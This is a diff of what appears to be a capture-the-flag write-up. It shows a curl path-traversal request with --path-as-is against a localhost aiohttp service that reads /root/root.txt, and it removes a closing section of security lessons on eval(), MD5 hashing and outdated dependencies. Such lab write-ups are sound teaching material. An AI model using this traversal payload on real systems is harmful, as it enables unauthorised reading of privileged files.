@@ -83,9 +83,3 @@ Using `curl` with `--path-as-is` to prevent path normalization, we traverse dire
 ```curl -s -X GET "http://localhost:8080/assets/../../../../../../../../../../../root/root.txt" --path-as-is```
 
 This successfully executes the arbitrary file read and displays the `root.txt` flag.
-
-## Conclusions & Key Lessons
-
-- **Unsafe Dynamic Code Execution:** File parsing modules must never pass untrusted user input directly to dynamic evaluation functions like eval().
-- **Insecure Credential Storage:** Storing user passwords using weak, unsalted hashing algorithms (e.g., MD5) allows rapid offline cracking once databases are compromised.
-- **Internal Dependency Management:** Internal local services must be updated regularly; outdated software running on localhost (aiohttp 3.9.1) still poses significant privilege escalation risks.
